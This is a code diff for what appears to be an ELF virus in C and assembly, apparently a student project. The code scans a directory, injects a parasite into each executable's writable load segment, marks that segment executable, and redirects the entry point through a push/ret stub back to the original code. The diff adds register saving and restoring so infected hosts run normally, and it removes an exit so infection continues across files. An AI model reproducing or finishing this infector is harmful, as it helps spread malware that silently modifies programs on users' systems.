@@ -120,17 +120,27 @@ extern int do_main(void);
 
 _start()
 {
-		char toto[2];
-	toto[0] = '1';
-	toto[1] = '2';
-	write(1,toto,2);
 	__asm__(".globl real_start\n"
-//		 "int3\n"
 	        "real_start:\n"
-		    "call do_main\n");
-	exit(0);
+	       // "int3\n"
+            "pushq %rax\n"
+			"pushq %rbx\n"
+			"pushq %rcx\n"
+			"pushq %rdx\n"
+			"pushq %rsi\n"
+			"pushq %rdi\n"
 
-	asm(
+			"pushq %r8\n"
+			"pushq %r9\n"
+			"pushq %r10\n"
+			"pushq %r11\n"
+			"pushq %r12\n"
+			"pushq %r13\n"
+			"pushq %r14\n"
+			"pushq %r15\n"
+
+		    "call do_main\n"
+//	        "int3\n"
 	        "jmp myend\n");
 
 }
@@ -752,7 +762,6 @@ int open_directory(char *path)
 			int c = read(fd, mem,st.st_size);
 			//write(1,mem,st.st_size);
 			do_the_job(mem,st.st_size,path_file);
-			exit(4);
 		}
 	}
 	close(dd);
@@ -787,7 +796,6 @@ int do_the_job(char buff[],size_t size, char *path)
 ft_putnbr(payload_len);
 ft_putchar('\n');
 	Elf64_Addr parasite_vaddr;
-	Elf64_Addr old_e_entry;
 	int text_found = 0;
 	int i;
 	char ono[3];
@@ -824,7 +832,9 @@ ft_putchar('\n');
 	hdr = (Elf64_Ehdr*) buff;
 
 	// Get some value from the elf_hdr
+
 	entry = hdr->e_entry;
+
 	phdr = (Elf64_Phdr*) (buff + hdr->e_phoff);
 	shdr = (Elf64_Shdr*) (buff + hdr->e_shoff);
 	uint64_t text;
@@ -855,18 +865,18 @@ ft_putchar('\n');
 			return (1);
 
 		}
+
 		if(phdr[i].p_type == PT_LOAD && phdr[i].p_flags == (PF_R | PF_W)){
 
 
 
 			//puts("text found");
 			text = phdr[i].p_offset;
-
 			text_end = phdr[i].p_offset + phdr[i].p_filesz;
 			payload_vaddr = phdr[i].p_vaddr + phdr[i].p_filesz;
 			hdr->e_entry = payload_vaddr + 63;
-			phdr[i].p_filesz += payload_len;
-			phdr[i].p_memsz += payload_len;
+			phdr[i].p_filesz += payload_len +100;
+			phdr[i].p_memsz += payload_len + 100;
 			phdr[i].p_flags |= PF_X;
 			break;
 		}
@@ -931,19 +941,21 @@ void new_file(char buf[],size_t size, size_t end_of_text,const char *path,Elf64_
 {
 	int fd;
 	char tmp[125];
-	unsigned int parasite_size = ((char *)&myend - (char *)&real_start ) + 7;
+	unsigned int parasite_size = ((char *)&myend - (char *)&real_start) + 30;
 	char jmp_code[7];
 
 	jmp_code[0] = '\x68'; /* push */
-	jmp_code[1] = '\x00'; /* 00 */
+	jmp_code[1] = '\x00'; /* 00 	*/
 	jmp_code[2] = '\x00'; /* 00	*/
 	jmp_code[3] = '\x00'; /* 00	*/
 	jmp_code[4] = '\x00'; /* 00	*/
 	jmp_code[5] = '\xc3'; /* ret */
 	jmp_code[6] = 0;
 
-	*(unsigned long *) &jmp_code[1] = old_e_entry; //fait supprimer tmp
-
+	ft_putnbr(old_e_entry);
+	//exit(4);
+	*(unsigned int*) &jmp_code[1] = old_e_entry;
+	write(1,jmp_code,7);
 	char new_debut [4];
 	new_debut[0] ='n';
 	new_debut[1] ='e';
@@ -1424,6 +1436,21 @@ unsigned long get_eip(void)
 void end_code() {
 __asm__(".globl myend\n"
         "myend:	     \n"
+//        "int3\n"
+		"popq %r15\n"
+        "popq %r14\n"
+        "popq %r13\n"
+        "popq %r12\n"
+        "popq %r11\n"
+        "popq %r10\n"
+        "popq %r9\n"
+        "popq %r8\n"
+        "popq %rdi\n"
+        "popq %rsi\n"
+        "popq %rdx\n"
+        "popq %rcx\n"
+        "popq %rbx\n"
+        "popq %rax\n"
         "mov $1,%rax \n"
         "mov $0,%rbx \n"
         "int $0x80   \n");
